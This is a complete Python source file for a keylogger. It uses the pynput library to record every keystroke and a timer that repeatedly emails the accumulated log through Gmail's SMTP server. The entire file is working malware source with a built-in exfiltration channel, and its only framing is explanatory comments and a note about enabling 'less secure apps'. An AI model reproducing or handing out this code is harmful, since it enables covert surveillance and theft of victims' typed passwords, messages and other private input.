#!/usr/bin/env python

import pynput.keyboard  # this library allows you to control and monitor input devices.
import threading        # constructs higher-level threading interfaces on top of the lower level _thread module
import smtplib          # protocol which handles sending e-mail and routing e-mail between mail servers


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log      = "Keylogger started"
        self.interval = time_interval
        self.email    = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    # function that processes every key pressed
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key =  " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    # function that reports to a specific email the keys pressed every 'self.interval' seconds
    def report(self):
        # !!DISCLAIMER for this function to work, you need to enable less secure apps to access Gmail.!!
        # Link: https://myaccount.google.com/lesssecureapps
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # function that sends an email to itself with a specific message
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # instanse of SMTP server, google's smtp server and port
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
